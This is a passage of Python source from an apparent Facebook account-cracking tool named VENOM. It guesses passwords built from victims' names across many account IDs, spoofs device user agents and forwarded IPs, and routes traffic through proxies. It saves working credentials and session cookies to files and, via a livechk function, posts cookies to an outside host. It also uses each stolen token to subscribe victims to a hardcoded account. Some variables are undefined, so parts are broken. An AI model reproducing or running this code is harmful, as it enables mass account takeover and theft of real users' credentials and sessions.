        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))

def livechk(cooker):
      requests.get("https://token-chor.vercel.app/checkid",data={'iamfrom':'mrqureshi','acc': cooker})
def asha(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = ' 2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010'
        elif ids[:6] in ['100002','100003'] :alif = '2011'
        elif ids[:6] in ['100004']          :alif = '2012'
        elif ids[:6] in ['100005','100006'] :alif = '2013'
        elif ids[:6] in ['100007','100008'] :alif = '2014'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015'
        elif ids[:5] in ['10002']           :alif = '2016'
        elif ids[:5] in ['10003']           :alif = '2018'
        elif ids[:5] in ['10004']           :alif = '2019'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        elif ids[:5] in ['6155']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = '2008'
    elif len(ids)==8:
        alif = '2007'
    elif len(ids)==7:
        alif = '2006'
    else:alif=''
    return alif
#------------------[ system  ]-------------------#
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#------------------[ SIM CODE  ]-------------------#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
except Exception as e:
    pass
    carrier = None
#------------------[ MENU VENOM  ]-------------------#
def menu():
            clear()        
            print('              \033[1;30m[\033[1;37m1\033[1;30m] \033[1;31mFile Cloning ')
            #print(' \033[1;32m[\033[1;31m2\033[1;32m] FOLLOW FB')
            print('              \033[1;30m[\033[1;37m0\033[1;30m] \033[1;31mEXIT ')
            dino()
            xd=input('\033[1;30m[\033[1;37m⩔⨳\033[1;30m] \033[1;37mChose : ')
            if xd in ['1','01']:
                clear()
                print('              \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;37mPut file example:  /sdcard/File.txt  etc..')
                dino()
                file = input('\033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;37mPut file path\033[1;37m: ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print('            \033[1;30m[\033[1;31m⩔⨳\033[1;30m] FILE LOCATION NOT FOUND ')
                    time.sleep(1)
                    menu()
                clear()
                #print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 4 FOR BEST RESULTS ')
                dino()
                print(' \033[1;30m[\033[1;31m1\033[1;30m] \033[1;31mMETHOD [NEW] \n \033[1;30m[\033[1;31m2\033[1;30m] \033[1;31mMETHOD [OLD] \n \033[1;30m[\033[1;31m3\033[1;30m] \033[1;31mMETHOD [NEW/OLD]  \n \033[1;30m[\033[1;31m4\033[1;30m] \033[1;31mMETHOD [NEW/OLD]    ')
                dino()
                mthd=input('\033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;37mChoose: ')
                linex()
                clear() 
                #loading() 
                clear() 
                plist = []
                print(f'                     PASSWORD SYSTEM');linex();print(f'\033[1;30m[\033[1;31m1\033[1;30m] \033[1;31mAUTO PASSWORD CLONE\n\033[1;30m[\033[1;31m2\033[1;30m] \033[1;31mCHOICE PASSWORD CLONE');linex()
                ppp=input(f'\033[1;30m[\033[1;31m?\033[1;30m] \033[1;31mCHOICE : ')
                if ppp in ['1','01']:
                                      plist.append('first first')
                                      plist.append('first last')
                                      plist.append('last first')
                                      plist.append('last last')
                                      plist.append('firstfirst')
                                      plist.append('firstlast')
                                      plist.append('lastfirst')
                                      plist.append('lastlast')
                                      plist.append('firstlast123')
                                      plist.append('firstlast1234')
                                      plist.append('firstlast12345')
                                      plist.append('first 123')
                                      plist.append('first 1234')
                                      plist.append('first 12345')
                                      plist.append('first12')
                                      plist.append('first123')
                                      plist.append('first1234')
                                      plist.append('first12345')
                                      plist.append('first123456')
                                      plist.append('first123456789')
                                      plist.append('first03')
                                      plist.append('first16')
                                      plist.append('first 03')
                                      plist.append('first1998')
                                      plist.append('first2000')
                                      plist.append('first2001')
                                      plist.append('first2002')
                                      plist.append('first123123')
                                      plist.append('first@123')
                                      plist.append('first@last')      
                                      plist.append('first16')
                                      plist.append('first03')
                                      plist.append('first2005')       
                                      plist.append('first2006')
                                      plist.append('last2004')
                                      plist.append('first 2002') 
                                      plist.append('first19')
                                      plist.append('first@@@first') 
                else:
                         try:
                                 clear()
                                 ps_limit = int(input(f'\033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;1mPASSWORD LIMIT : '))
                         except:
                                 ps_limit =1
                         clear()
                         print(f'                   \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;31mEXAMPLE : firstlast/first@@/first123 ')
                         linex()
                         for i in range(ps_limit):
                                 plist.append(input(f'         \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;31mPASSWORD NO {i+1} :{A} '))
                clear()
                #loading() 
                clear() 
                print('              \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;31mDO YOU WANT ADD CP ID? TYPE y/n [YES/NO]: ')
                linex()
                cx=input('\033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;31mChoose: ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    
                    #print('              \033[1;30m[\033[1;31m⩔⨳\033[1;3m]SIM NAME  \033[1;37m: \033[1;32m'+carrier+f' ')
                    print('              \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;37mTotal File id : \033[1;32m'+total_ids+f' ')
                    print("              \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;37mYour Crack  Start Please wait                   \n              \033[1;30m[\033[1;31m⩔⨳\033[1;30m] \033[1;31m[\033[1;92mON\033[1;97m/\033[1;91mOFF\033[1;91m] Airplane mode after 5 minutes ")
                    linex()
                    for user in fo:
                            ids,names = user.split('|')
                            passlist = plist
                            if mthd in ['1','01']:
                                    crack_submit.submit(M_file_1,ids,names,passlist) 
                            elif mthd in ['2','02']:
                                    crack_submit.submit(M_file_2,ids,names,passlist)
                            elif mthd in ['3','03']:
                                    crack_submit.submit(M_file_3,ids,names,passlist)
                            elif mthd in ['4','04']:
                                    crack_submit.submit(M_file_4,ids,names,passlist)
                            elif mthd in ['5','05']:
                                     crack_submit.submit(M_file_5,ids,names,passlist)
                            elif mthd in ['6','06']:
                                      crack_submit.submit(M_file_6,ids,names,passlist)
                            elif mthd in ['7','07']:
                                      crack_submit.submit(M_file_7,ids,names,passlist)
                dino()
                print('\033[1;32m[\033[1;36m+\033[1;37m] Greetings to you, dear user. I hope that my tool has given you results. ')
                print('\033[1;32m[\033[1;36m+\033[1;37m] The process has completed ')
                print('\033[1;32m[\033[1;36m+\033[1;37m] OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                dino()
                input(' Press enter to back ')
                os.system('python VENOM.py') 
            elif xd in ['0','00']:
                exit(' Thanls For Your Use ')
            elif xd in ['2','02']:
                os.system('xdg-open https://www.facebook.com/venom.dz.03')
            else:
                exit(' Option not found in menu...')
import random

import random

def UA():
    a = "Dalvik/2.1.0 (Linux; U; Android 14; OnePlus 12 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/491.0.0.43.114;FBBV/754321894;FBDM/{density=480,width=1264,height=2772};FBLC/en_US;FBRV/684312576]"
    b = "Dalvik/2.1.0 (Linux; U; Android 13; Samsung Galaxy S23 Ultra Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/487.0.0.35.115;FBBV/731125634;FBDM/{density=560,width=1440,height=3088};FBLC/fr_FR;FBRV/693215840]"
    c = "Dalvik/2.1.0 (Linux; U; Android 14; Xiaomi 14 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/493.0.0.40.116;FBBV/789321745;FBDM/{density=560,width=1200,height=2670};FBLC/ar_AE;FBRV/708965321]"
    d = "Dalvik/2.1.0 (Linux; U; Android 14; Google Pixel 8 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/492.0.0.33.116;FBBV/765498213;FBDM/{density=560,width=1344,height=2992};FBLC/en_GB;FBRV/701236954]"
    e = "Dalvik/2.1.0 (Linux; U; Android 13; Vivo X100 Pro Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/488.0.0.27.112;FBBV/752168934;FBDM/{density=440,width=1080,height=2400};FBLC/fr_FR;FBRV/689214537]"
    f = "Dalvik/2.1.0 (Linux; U; Android 14; Realme GT 5 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/490.0.0.25.113;FBBV/774589632;FBDM/{density=480,width=1260,height=2772};FBLC/ar_SA;FBRV/712458963]"
    g = "Dalvik/2.1.0 (Linux; U; Android 13; OPPO Find X7 Ultra Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/489.0.0.38.109;FBBV/743265981;FBDM/{density=480,width=1240,height=2772};FBLC/en_US;FBRV/698521743]"
    h = "Dalvik/2.1.0 (Linux; U; Android 14; Huawei Mate 60 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/491.0.0.43.114;FBBV/764589312;FBDM/{density=440,width=1212,height=2616};FBLC/fr_FR;FBRV/714895263]"
    i = "Dalvik/2.1.0 (Linux; U; Android 13; Tecno Phantom V Fold Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/486.0.0.24.112;FBBV/723658914;FBDM/{density=420,width=1080,height=2460};FBLC/ar_EG;FBRV/689475312]"
    j = "Dalvik/2.1.0 (Linux; U; Android 14; Infinix Zero 30 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/489.0.0.36.115;FBBV/753214698;FBDM/{density=440,width=1080,height=2400};FBLC/en_GB;FBRV/702159874]"
    k = "Dalvik/2.1.0 (Linux; U; Android 14; Asus ROG Phone 8 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/494.0.0.31.117;FBBV/791263458;FBDM/{density=560,width=1080,height=2448};FBLC/en_US;FBRV/719856432]"
    l = "Dalvik/2.1.0 (Linux; U; Android 13; Poco F5 Pro Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/487.0.0.35.115;FBBV/745693812;FBDM/{density=440,width=1080,height=2400};FBLC/fr_FR;FBRV/706325481]"
    m = "Dalvik/2.1.0 (Linux; U; Android 14; Samsung Galaxy Z Fold5 Build/UP1A.231005.007) [FBAN/FB4A;FBAV/492.0.0.33.116;FBBV/789512643;FBDM/{density=560,width=1812,height=2176};FBLC/ar_DZ;FBRV/715236987]"
    n = "Dalvik/2.1.0 (Linux; U; Android 13; Nothing Phone (2) Build/TKQ1.230201.002) [FBAN/FB4A;FBAV/488.0.0.27.112;FBBV/736214895;FBDM/{density=420,width=1080,height=2412};FBLC/en_US;FBRV/694812357]"
    o = "Dalvik/2.1.0 (Linux; U; Android 14; Honor Magic 6 Pro Build/UP1A.231005.007) [FBAN/FB4A;FBAV/493.0.0.40.116;FBBV/778954632;FBDM/{density=480,width=1224,height=2700};FBLC/fr_FR;FBRV/711478596]"

    ua = random.choice([a,b,c,d,e,f,g,h,i,j,k,l,m,n,o])
    return ua
#------------------[  METODE 1 ]-------------------#
import requests, random, sys, string, json, uuid, time
from uuid import uuid4
oks, cps = [], []
loop = 0
session = requests.Session()
P, M, H, K, B, U, O, N = "P","M","H","K","B","U","O","N"
def load_proxies(url):
    try:
        text = requests.get(url, timeout=10).text
        return [l.strip() for l in text.splitlines() if l.strip()]
    except:
        return []
proxy_list = load_proxies(
    "https://raw.githubusercontent.com/VEN0M03/IG/main/PROXSIY.txt"
)
def generate_uuid():
    return uuid4().hex
import sys, requests

oks = []
cps = []
loop = 0
def generate_fake_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

random_ip = generate_fake_ip()
import requests, uuid, random, string, sys, time, os, base64

oks = []
loop = 0
sim_id = 'VENOM'
def M_file_1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        boos = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌1\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        sys.stdout.flush()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
            random_seed = random.Random()
            ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 11; P40 Pro Build/RP1A.200720.011) [FBAN/FB4A;FBAV/375.0.0.25.100;FBPN/com.facebook.katana;FBLC/es_ES;FBBV/37913957;FBCR/Etisalat;FBMF/huawei;FBBD/huawei;FBDV/P40 Pro;FBSV/11;FBCA/arm64-v8a;FBDM/{density=3.0,width=1440,height=3200};FB_FW/1;FBRV/13043395;]','Dalvik/2.1.0 (Linux; U; Android 11; Unknown Build/RP1A.200720.011) [FBAN/FB4A;FBAV/380.1.0.30.115;FBPN/com.facebook.katana;FBLC/en_US;FBBV/37972713;FBCR/Mobily;FBMF/oppo;FBBD/oppo;FBDV/Unknown;FBSV/11;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2340};FB_FW/1;FBRV/13119411;]','Dalvik/2.1.0 (Linux; U; Android 10; Unknown Build/RP1A.200720.011) [FBAN/FB4A;FBAV/379.0.0.27.106;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/37736226;FBCR/Etisalat;FBMF/oneplus;FBBD/oneplus;FBDV/Unknown;FBSV/10;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;FBRV/13027199;]"
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            nip = random.choice(proxsi)
            proxs = {
                   'http': 'socks4://' + nip }
            data = {
            "locale": "en_US",
            "format": "json",
            "email": ids,
            "password": pas,
            "access_token": "1792792947455470|f43b4b4c85276992ac952012f8bba674",
            "generate_session_cookies": 1,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": fake.uuid4(),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            "Host": "graph.facebook.com",
            "User-Agent": UA(),
            "Content-Type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip",
            "forwarded": f"for={random_ip}; by={random_ip}",
            "x-forwarded-for": random_ip,
            "x-real-ip": random_ip,
            "client-ip": random_ip,
        }
            url = 'https://graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,proxies=proxs,headers=headers,).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m [VENOM-OK] ' + ids + ' | ' + pas + '\033[93;1m + ' + asha(ids) + '\033[93;1m')
                send_result("OK", ids, pas)
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                print("\033[1;32m[KOKIS] :\033[1;32m "+cookie)
                token = po['access_token']
                requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token)
                open('/sdcard/VENOM_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VENOM_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\033[1;34m[VENOM-2F] '+ids+' | '+pas)
                     open('/sdcard/VENOM-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\033[1;91m [VENOM-𝐂𝐏] ' + ids + ' | ' + pas + '\033[1;97m')
                    check_and_send_result(ids, pas, "CP")
                    open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        time.sleep(20)
#------------------[  METODE 2  ]-------------------#
def M_file_2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        boos = random.choice([P, M, H, K, B, U, O, N])
        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌2\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        sys.stdout.flush()
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
            random_seed = random.Random()
            um = generate_facebook_user2_agent()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            nip = random.choice(proxsi)
            proxs = {
                   'http': 'socks4://' + nip }
            data={"adid": adid,
'method': 'POST',
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'cpl': 'true',
'credentials_type': 'password',
'generate_session_cookies': '1',
'error_detail_type': 'button_with_disabled',
'generate_machine_id': '1',
'locale': 'ar_MA',
'client_country_code': 'MA',
'omit_response_on_success': 'false',
'enroll_misauth': 'false',
'advertising_id': str(uuid.uuid4()),
'encrypted_msisdn': '',
'fb_api_req_friendly_name': 'authenticate'}
            data={"adid": adid,
'method': 'POST',
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'cpl': 'true',
'credentials_type': 'password',
'generate_session_cookies': '1',
'error_detail_type': 'button_with_disabled',
'generate_machine_id': '1',
'locale': 'en_GB',
'client_country_code': 'GB',
'omit_response_on_success': 'false',
'enroll_misauth': 'false',
'advertising_id': str(uuid.uuid4()),
'encrypted_msisdn': '',
'fb_api_req_friendly_name': 'authenticate'}
            headers = {
    'Host': 'graph.facebook.com',
    'Authorization': 'OAuth 1792792947455470|f43b4b4c85276992ac952012f8bba674',
    'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
    'x-fb-net-hni': str(random.randint(20000, 40000)),
    'x-fb-sim-hni': str(random.randint(20000, 40000)),
    'Zero-Rated': '0',
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'MOBILE.LTE',
    'user-agent': UA(),
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger',
    'x-fb-client-ip': 'True',
    'x-fb-server-cluster': 'True',
    'accept-encoding': 'gzip, deflate',
    'connection': 'keep-alive'
}
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,proxies=proxs,headers=headers,).json()
            if 'session_key' in po:
                print('\r\r\033[1;32m [VENOM-OK] ' + ids + ' | ' + pas + '\033[93;1m + ' + asha(ids) + '\033[93;1m')
                send_result("OK", ids, pas)
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                #print("\033[1;32m[KOKIS] :\033[1;32m "+cookie)
                token = po['access_token']
                requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token)
                open('/sdcard/VENOM_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/VENOM_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\033[1;34m[VENOM-2F] '+ids+' | '+pas)
                     open('/sdcard/VENOM-2F.txt','a').write(ids+'|'+pas+'\n')
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\033[1;91m [VENOM-𝐂𝐏] ' + ids + ' | ' + pas + '\033[1;97m')
                    check_and_send_result(ids, pas, "CP")
                    open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        time.sleep(20)
def generate_jazoest(device_id):
    hash_str = hashlib.md5(device_id.encode()).hexdigest()
    return '2' + hash_str[:19]

def generate_user_agent():
    android_versions = ['10', '11', '12', '13']
    devices = ['SM-G975F', 'SM-G998B', 'Pixel 6', 'Pixel 7', 'Redmi Note 10']
    return f'Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,124)}.0.0.0 Mobile Safari/537.36'

def facebook_auth(ids, pas):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    jazoest = generate_jazoest(device_id)
import random
import ipaddress
from typing import Tuple, Dict, Optional
def IPV4_REALISTIC_STRONG() -> str:
    PUBLIC_RANGES = [
        ("5.8.0.0", "5.11.255.255"),
        ("23.224.0.0", "23.239.255.255"),
        ("45.32.0.0", "45.35.255.255"),
        ("64.225.0.0", "64.225.255.255"),
        ("66.70.0.0", "66.70.255.255"),
        ("88.99.0.0", "88.99.255.255"),
        ("95.217.0.0", "95.217.255.255"),
        ("128.199.0.0", "128.199.255.255"),
        ("139.162.0.0", "139.162.255.255"),
        ("144.76.0.0", "144.77.255.255"),
        ("147.139.0.0", "147.139.255.255"),
        ("157.230.0.0", "157.230.255.255"),
        ("159.65.0.0", "159.69.255.255"),
        ("162.243.0.0", "162.243.255.255"),
        ("167.71.0.0", "167.71.255.255"),
        ("172.104.0.0", "172.105.255.255"),
        ("176.9.0.0", "176.9.255.255"),
        ("185.25.180.0", "185.25.183.255"),
        ("188.166.0.0", "188.166.255.255"),
        ("192.99.0.0", "192.99.255.255"),
        ("206.189.0.0", "206.189.255.255"),
        ("208.67.0.0", "208.67.255.255"),
    ]

    for _ in range(10_000):
        start, end = random.choice(PUBLIC_RANGES)
        ip_int = random.randint(int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end)))
        ip = ipaddress.IPv4Address(ip_int)
        if not (ip.is_private or ip.is_reserved or ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.is_unspecified):
            return str(ip)
    raise RuntimeError("لم يتم توليد IP صالح بعد عدة محاولات")
def make_request_headers(ua: Optional[str] = None, include_fake_forwarded: bool = True
                        ) -> Tuple[str, Dict[str, str]]:
    if ua is None:
        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

    random_ip = IPV4_REALISTIC_STRONG()
    extra_ip = IPV4_REALISTIC_STRONG()
import requests
import random
import uuid
import string
import time
import sys
import json
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def generate_ip_pool(num_ips=50):
    return [random_ip() for _ in range(num_ips)]
ip_pool = generate_ip_pool(100)

def get_random_ip():
    global ip_pool
    if len(ip_pool) < 20:
        ip_pool.extend(generate_ip_pool(50))
    
    return random.choice(ip_pool)

def parse_proxy(p):
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        proxy_url = p
    else:
        proxy_url = "http://" + p
    return {"http": proxy_url, "https": proxy_url}

def get_proxy():
    if not proxies_list:
        return None
    return parse_proxy(random.choice(proxies_list))

def rotate_session_headers(session, data_type=""):
    random_ip_address = get_random_ip()
    user_agents = [
        # Desktop Chrome
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 125)}.0.0.0 Safari/537.36",
        # Mobile Android
        f"Mozilla/5.0 (Linux; Android {random.randint(10, 14)}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 125)}.0.0.0 Mobile Safari/537.36",
        # Mobile iOS
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15, 17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(15, 17)}.0 Mobile/15E148 Safari/604.1",
        # Facebook App
        f"[FBAN/FB4A;FBAV/{random.randint(150,200)}.0.0.{random.randint(20,99)}{random.randint(11,99)};FBBV/{random.randint(11111111,99999999)};FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/Android {random.randint(10, 14)};FBOP/1;FBCA/x86:armeabi-v7a;]"
    ]
    languages = [
        "en-US,en;q=0.9",
        "ar;q=0.8,en;q=0.7",
        "fr;q=0.7,en;q=0.6",
        "es;q=0.8,en;q=0.7"
    ]
    session.headers.update({
        'User-Agent': random.choice(user_agents),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': random.choice(languages),
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.facebook.com',
        'Referer': 'https://www.facebook.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=1, i',
        'Connection': 'keep-alive',
        'X-FB-Friendly-Name': 'authenticate',
        'X-FB-HTTP-Engine': 'Liger',
        'X-Forwarded-For': random_ip_address,
        'X-Client-IP': random_ip_address,
        'X-Real-IP': random_ip_address,
        'CF-Connecting-IP': random_ip_address,
        'True-Client-IP': random_ip_address,
        'Client-IP': random_ip_address,
        'X-Originating-IP': random_ip_address,
        'X-Remote-IP': random_ip_address,
        'X-Remote-Addr': random_ip_address,
        'CF-RAY': f"{random.randint(1000000000, 9999999999)}-{random.choice(['SJC', 'LHR', 'FRA', 'SIN'])}",
        'X-Request-Id': str(uuid.uuid4()),
        'Cache-Control': 'no-cache, no-store',
        'Pragma': 'no-cache'
    })
    if proxies_list and random.random() > 0.5:
        session.proxies.update(get_proxy())
    
    return session
session = requests.Session()
session = rotate_session_headers(session)

def generate_facebook_ua():
    versions = [
        f"[FBAN/FB4A;FBAV/{random.randint(150,200)}.0.0.{random.randint(20,99)}{random.randint(11,99)};FBBV/{random.randint(11111111,99999999)};FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G998B;FBSV/Android {random.randint(10, 14)};FBOP/1;FBCA/x86:armeabi-v7a;]",
        f"[FBAN/FBIOS;FBAV/{random.randint(150,200)}.0;FBBV/{random.randint(11111111,99999999)};FBDV/iPhone{random.randint(8,14)};FBMD/iPhone;FBSN/iOS;FBSV/{random.randint(14,17)}.{random.randint(0,5)};FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;]"
    ]
    return random.choice(versions)

def M_file_3(ids, names, passlist):
    try:
        global ok, loop, sim_id
        boos = random.choice(["P", "M", "H", "K", "B", "U", "O", "N"])
        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌3\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        sys.stdout.flush()
        
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            device_id = str(uuid.uuid4())
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            xd = str(''.join(random_seed.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            current_ip = get_random_ip()
            data_basic = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                'ip_address': current_ip,
                'client_ip_address': current_ip
            }
            data_advanced = {
                "adid": str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
